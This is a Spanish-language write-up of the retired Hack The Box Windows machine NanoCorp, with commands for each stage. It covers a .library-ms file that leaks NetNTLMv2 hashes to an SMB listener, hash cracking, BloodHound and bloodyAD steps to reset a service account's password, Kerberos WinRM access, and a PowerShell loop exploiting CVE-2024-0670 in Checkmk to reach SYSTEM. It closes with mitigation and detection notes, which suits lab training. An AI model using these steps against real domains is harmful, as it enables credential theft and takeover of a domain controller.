---
machine: NanoCorp
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, ntlm, cve-2025-24071, bloodhound, kerberos, checkmk, privesc]
---

# NanoCorp — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El portal de contratación `hire.nanocorp.htb` acepta un ZIP con el CV. Un archivo `.library-ms` con una ruta UNC hace que Windows autentique contra SMB y filtra el NetNTLMv2 de `web_svc`. BloodHound muestra que `web_svc` puede añadir miembros a `IT_Support`, y ese grupo puede resetear la contraseña de `monitoring_svc`. Como está en Protected Users, solo funciona Kerberos; con WinRM sobre 5986 se obtiene shell y el agente Checkmk permite escalar a SYSTEM.

## Reconocimiento

```bash
nmap -Pn -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389 <IP>
```

- Controlador de dominio con DNS, Kerberos, LDAP, SMB y WinRM.
- RDP (3389) escucha en el host, pero no se usa; el acceso es por WinRM SSL en `5986`.
- `80` publica el portal de empleo y `hire.nanocorp.htb` el de subida de CV.
- El dominio es `nanocorp.htb`.

## Enumeración

Se crea una cuenta en el portal y se sube un ZIP con un `.library-ms` que apunta a `\\<IP>\share`. Al procesarlo, el servidor intenta abrir el recurso y envía el hash NetNTLMv2 de `web_svc` a un listener de Responder. `hashcat -m 5600` lo crackea.

```xml
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\<IP>\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

## Foothold

Con las credenciales de `web_svc` se ejecuta BloodHound. El usuario tiene permisos para añadir cuentas a `IT_Support`; ese grupo puede cambiar la contraseña de `monitoring_svc`. Como `monitoring_svc` pertenece a Protected Users, NTLM queda bloqueado y hay que usar Kerberos.

```bash
bloodhound-python -u web_svc -p '<password>' -d nanocorp.htb -ns <IP> -c All
```

## Movimiento lateral

Se añade `web_svc` a `IT_Support`, se resetea la contraseña de `monitoring_svc`, se genera un `krb5.conf` y se conecta con Kerberos. WinRM por SSL en `5986` acepta la sesión; Evil-WinRM clásico no soporta esta autenticación, así que se usa `evil-winrm-py`.

```bash
bloodyAD --host dc01.nanocorp.htb -u web_svc -p '<password>' add groupMember IT_Support web_svc
bloodyAD --host dc01.nanocorp.htb -u web_svc -p '<password>' set password monitoring_svc '<newpassword>'
netexec smb nanocorp.htb -u web_svc -p '<password>' --generate-krb5-file krb5.conf
evil-winrm-py -i dc01.nanocorp.htb -u monitoring_svc -p '<newpassword>' -k --ssl --port 5986
```

## Escalada de privilegios

El host tiene el agente Checkmk. La versión es anterior a 2.2.0p23/2.1.0p40 y es vulnerable a CVE-2024-0670: el agente ejecuta archivos temporales `cmk_all_*_1.cmd` en `C:\Windows\Temp` con privilegios de SYSTEM. Se siembran los nombres esperados como solo lectura y se lanza el instalador/MSI para que los ejecute.

```powershell
10000..30000 | foreach {
  copy payload.cmd C:\Windows\Temp\cmk_all_${_}_1.cmd
  Set-ItemProperty C:\Windows\Temp\cmk_all_${_}_1.cmd -Name IsReadOnly -Value $true
}
```

## Evidencia

- ZIP con `.library-ms` y hash NetNTLMv2 capturado.
- Ruta de BloodHound de `web_svc` a `IT_Support`.
- `krb5.conf` y WinRM SSL con Kerberos.
- Archivos `cmk_all_*` ejecutados como SYSTEM.

## Lecciones aprendidas

- Los formatos de documento pueden iniciar autenticación saliente.
- Los permisos de grupo anidados permiten resetear cuentas de servicio.
- Protected Users obliga a Kerberos y bloquea técnicas NTLM.
- Un agente de monitorización con ejecución de plugins es una vía de SYSTEM.

## Mitigación y detección

- Bloquear SMB saliente y aplicar reglas a `.library-ms`/`.searchConnector-ms`.
- Revisar ACLs de grupos y evitar `ForceChangePassword` amplio.
- Actualizar Checkmk y restringir la escritura en `C:\Windows\Temp`.
- Alertar sobre autenticaciones NTLM desde servidores y creación de `cmk_all_*`.

## Referencias

- [0xdf — NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [IppSec — NanoCorp](https://www.youtube.com/watch?v=8CjoKTPjbbk)
- [Hack The Box — NanoCorp](https://app.hackthebox.com/machines/nanocorp)
